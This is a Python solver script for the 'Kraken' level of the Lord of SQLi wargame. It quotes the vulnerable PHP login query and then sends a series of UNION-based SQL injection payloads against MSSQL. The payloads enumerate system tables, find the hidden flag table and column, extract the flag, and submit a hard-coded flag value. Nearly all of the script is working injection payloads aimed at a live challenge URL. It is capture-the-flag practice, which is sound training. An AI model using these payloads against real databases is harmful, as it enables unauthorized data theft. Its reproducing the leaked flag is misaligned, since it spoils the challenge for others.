#!/usr/bin/env python3
import los
import los_cookies as lc


def main():
    """
    Kraken 45

    if(preg_match('/master|information|;/i', $_GET['id'])) exit("No Hack ~_~");
    if(preg_match('/master|information|;/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = "select id from member where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
    if($result['id']) echo "<h2>{$result['id']}</h2>";

    if($krakenFlag === $_GET['pw']) solve("kraken");
    // Flag is in `flag_{$hash}` table, not in `member` table. Let's look over whole of the database.
    """

    url = "https://los.rubiya.kr/chall/kraken_647f3513b94339a4c59cf6f9074d0f92.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'

    payload = "' union select count(name) from sys.sysobjects--"
    p = los.SqlInjection(url, cook, method, inj_param, payload)
    p.resp_with_message(text='9')

    p.payload = "' union select name from sys.sysobjects order by 1 offset 2 rows--"
    p.resp_with_message(text='flag')

    p.payload = "' union select id from sys.sysobjects where name='flag_ccdfe62b'--"
    p.resp_with_message(text='901578250')

    p.payload = "' union select name from sys.all_columns where object_id=901578250--"
    p.resp_with_message(text='flag')

    p.payload = "' union select flag_ab15b600 from flag_ccdfe62b--"
    p.resp_with_message(text='FLAG')

    p.payload = 'FLAG{a0819fc56beae985bac7d175c974cd27}'
    response = p.my_request()
    if 'Clear!' in response:
        print('\nKraken Clear!')


if __name__ == '__main__':
    main()
